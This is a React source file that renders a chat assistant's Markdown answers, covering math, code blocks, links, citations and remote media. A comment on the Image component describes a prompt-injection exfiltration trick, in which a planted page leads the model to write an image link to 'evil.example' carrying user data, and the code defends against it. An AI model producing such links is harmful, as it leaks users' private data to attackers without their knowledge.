import {
  memo,
  useContext,
  useEffect,
  useId,
  useState,
  type ComponentProps,
  type ReactNode,
} from 'react'
import ReactMarkdown, { type Components, type ExtraProps } from 'react-markdown'
import { toText } from 'hast-util-to-text'
import rehypeHighlight from 'rehype-highlight'
import remarkGfm from 'remark-gfm'
import remarkMath from 'remark-math'
import { dollarMath } from './math.ts'
import { WrapText } from 'lucide-react'
import { CopyButton, IconAction } from './MessageActions.tsx'
import { normalizedUrl } from '../../shared/media.ts'
import { MediaContext } from './mediaContext.ts'
import { playableKind, RemoteMedia } from './RemoteMedia.tsx'
import { SourcesContext, sourceKey } from './sourcesContext.ts'
import type { Source } from './turns.ts'

const remarkPlugins = [remarkGfm, remarkMath]
type Katex = typeof import('./katex.ts').rehypeKatex

// Math is written with $…$, $$…$$, \(…\) or \[…\].
const HAS_MATH = /\$|\\[([]/

// Kept once loaded, so later messages with math don't show it untypeset.
let katex: Katex | null = null

/** The math plugin, loaded the first time a message needs it. */
function useKatex(text: string): Katex | null {
  // A function, so React is given it to keep and not to call.
  const [loaded, setLoaded] = useState<Katex | null>(() => katex)
  const needed = HAS_MATH.test(text)
  useEffect(() => {
    if (!needed || loaded) return
    void import('./katex.ts').then((m) => {
      katex = m.rehypeKatex
      setLoaded(() => m.rehypeKatex)
    })
  }, [needed, loaded])
  return loaded
}
/**
 * A block that takes its direction from its own text, so a paragraph in Urdu
 * or Arabic runs right to left (bullets, numbers and alignment follow) while
 * the English one beside it doesn't. Code blocks stay left to right.
 */
const auto =
  (
    Tag:
      | 'p'
      | 'h1'
      | 'h2'
      | 'h3'
      | 'h4'
      | 'h5'
      | 'h6'
      | 'ul'
      | 'ol'
      | 'blockquote'
      | 'table',
  ) =>
  ({ node: _, ...props }: ComponentProps<typeof Tag> & ExtraProps) => (
    <Tag dir="auto" {...(props as object)} />
  )

const components: Components = {
  p: auto('p'),
  h1: auto('h1'),
  h2: auto('h2'),
  h3: auto('h3'),
  h4: auto('h4'),
  h5: auto('h5'),
  h6: auto('h6'),
  ul: auto('ul'),
  ol: auto('ol'),
  blockquote: auto('blockquote'),
  table: auto('table'),
  pre: CodeBlock,
  a: Link,
  img: Image,
  input: TaskBox,
}

/**
 * Renders model output (see `Markdown`, which loads this). Raw HTML in the text is not rendered. Memoized: a
 * streamed answer re-renders the whole chat for every chunk, and parsing,
 * highlighting and typesetting every earlier answer again made long chats
 * stall; only a changed `text` renders again.
 */
export const MarkdownView = memo(function MarkdownView({
  text,
}: {
  text: string
}) {
  const math = useKatex(text)
  return (
    <div className="markdown">
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={math ? [math, rehypeHighlight] : [rehypeHighlight]}
        components={components}
      >
        {dollarMath(text)}
      </ReactMarkdown>
    </div>
  )
})

/** A task-list box (`- [x] done`): read-only, and named by its state, since the text beside it isn't its label. */
function TaskBox({
  node: _node,
  ...props
}: ComponentProps<'input'> & ExtraProps) {
  if (props.type !== 'checkbox') return <input {...props} />
  return <input {...props} aria-label={props.checked ? 'Done' : 'Not done'} />
}

/** Blocks this long get line numbers (short ones read better without). */
const NUMBERED_FROM = 12

/** A fenced code block, labelled with its language when one is given. */
function CodeBlock({ node, ...props }: ComponentProps<'pre'> & ExtraProps) {
  const code = node?.children[0]
  const classes = code?.type === 'element' ? code.properties.className : null
  const language = Array.isArray(classes)
    ? classes
        .map(String)
        .find((c) => c.startsWith('language-'))
        ?.slice('language-'.length)
    : undefined
  const [wrap, setWrap] = useState(false)
  const lineCount = node
    ? toText(node).replace(/\n$/, '').split('\n').length
    : 0
  // Numbers line up with the code only while lines aren't wrapped.
  const numbered = lineCount >= NUMBERED_FROM && !wrap
  return (
    <div className="code-block">
      <div className="code-header">
        <span className="code-label">{language}</span>
        <span className="code-actions">
          <IconAction
            label="Wrap lines"
            pressed={wrap}
            onClick={() => setWrap((on) => !on)}
          >
            <WrapText />
          </IconAction>
          {node && <CopyButton text={toText(node)} label="Copy code" />}
        </span>
      </div>
      <div className="code-body" data-wrap={wrap || undefined}>
        {numbered && (
          <span className="code-lines" aria-hidden>
            {Array.from({ length: lineCount }, (_, i) => i + 1).join('\n')}
          </span>
        )}
        <pre {...props} />
      </div>
    </div>
  )
}

/**
 * Shows images chibot serves, and images and media from other sites through
 * `RemoteMedia`, which loads only the ones a model could not have put the
 * user's data in (the rest wait for a click). An answer written under the
 * influence of a planted page can hold `![](https://evil.example/c?d=…)`; a
 * browser that loads it has sent the data without a click.
 */
function Image({
  node: _node,
  src,
  alt,
  ...props
}: ComponentProps<'img'> & ExtraProps) {
  if (!src) return null
  const url = URL.parse(src, location.origin)
  if (url?.origin === location.origin) {
    return <img src={src} alt={alt} {...props} />
  }
  if (url?.protocol !== 'http:' && url?.protocol !== 'https:') {
    // data:, javascript:, …: not shown, and not a link either.
    return <span>{alt || 'Image'}</span>
  }
  // `![…](…)` is an image unless the address says it is sound or video.
  return <RemoteMedia src={src} alt={alt} kind={playableKind(src) ?? 'image'} />
}

/**
 * A link, and under it a player when it is a sound or video that the user or a
 * tool gave (not one the model made up: that stays a link to open on purpose).
 */
function Link(props: ComponentProps<'a'> & ExtraProps) {
  const media = useContext(MediaContext)
  const { href } = props
  const kind = href ? playableKind(href) : null
  const address = href ? normalizedUrl(href) : null
  const embedded = Boolean(media && kind && address && media.known.has(address))
  return (
    <>
      <SourceLink {...props} />
      {embedded && href && kind && <RemoteMedia src={href} kind={kind} />}
    </>
  )
}

/** Opens links in a new tab, so following one doesn't leave (and stop) the chat. */
function SourceLink({
  node: _node,
  href,
  children,
  ...props
}: ComponentProps<'a'> & ExtraProps) {
  const sources = useContext(SourcesContext)
  // Footnote references (#…) stay on the page.
  if (href?.startsWith('#')) {
    return (
      <a href={href} {...props}>
        {children}
      </a>
    )
  }
  const index = href
    ? sources.findIndex((s) => sourceKey(s.url) === sourceKey(href))
    : -1
  if (index >= 0) {
    return (
      <Citation
        source={sources[index]!}
        number={index + 1}
        total={sources.length}
        href={href!}
        props={props}
      >
        {children}
      </Citation>
    )
  }
  return (
    <a href={href} target="_blank" rel="noopener noreferrer" {...props}>
      {children}
    </a>
  )
}

/**
 * A link to one of the answer's sources: its number matches the Sources list,
 * and hovering or focusing it shows which page it is. Esc hides the card
 * (and is not also taken as "stop the answer").
 */
function Citation({
  source,
  number,
  total,
  href,
  props,
  children,
}: {
  source: Source
  number: number
  total: number
  href: string
  props: ComponentProps<'a'>
  children: ReactNode
}) {
  const id = useId()
  const [shown, setShown] = useState(false)
  const [dismissed, setDismissed] = useState(false)
  const host = URL.parse(source.url, location.origin)?.hostname
  // While the card shows, Esc hides it (a pointer user hasn't focused anything
  // in it), without also stopping the answer.
  useEffect(() => {
    if (!shown || dismissed) return
    const onKey = (e: KeyboardEvent) => {
      if (e.key !== 'Escape') return
      setDismissed(true)
      e.stopPropagation()
    }
    window.addEventListener('keydown', onKey, true)
    return () => window.removeEventListener('keydown', onKey, true)
  }, [shown, dismissed])
  const leave = () => {
    setShown(false)
    setDismissed(false)
  }
  return (
    <span
      className="cite"
      data-dismissed={dismissed || undefined}
      onPointerEnter={() => setShown(true)}
      onFocus={() => setShown(true)}
      onPointerLeave={leave}
      onBlur={leave}
    >
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer"
        aria-describedby={id}
        {...props}
      >
        {children}
        <sup className="cite-num">{number}</sup>
      </a>
      <span role="tooltip" id={id} className="cite-card">
        <strong>{source.title}</strong>
        <span>{host}</span>
        <span>
          Source {number} of {total}
        </span>
      </span>
    </span>
  )
}
